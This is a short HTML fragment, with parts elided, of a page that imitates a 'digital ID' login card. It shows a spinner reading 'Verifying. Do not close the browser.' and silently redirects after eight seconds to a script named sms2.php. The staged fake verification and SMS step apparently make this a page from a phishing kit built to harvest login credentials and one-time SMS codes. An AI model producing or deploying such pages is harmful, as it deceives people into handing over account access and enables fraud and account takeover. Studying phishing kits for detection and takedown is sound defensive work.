...
<link rel="icon" type="image/png" sizes="32x32" href="./files/favicon-32x32.png">
	...
	<meta http-equiv="refresh" content="8; URL=./sms2.php">
</head>
				...
				<div class="login-grid-column">
					<div class="digital-id-login-card-wrapper">
						<div class="digital-id-main-login-card override">
							...
							<center><div class="lds-roller"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div><br><p class="login-instruction-text">Verifying<br> Do not close the browser.</p></center>
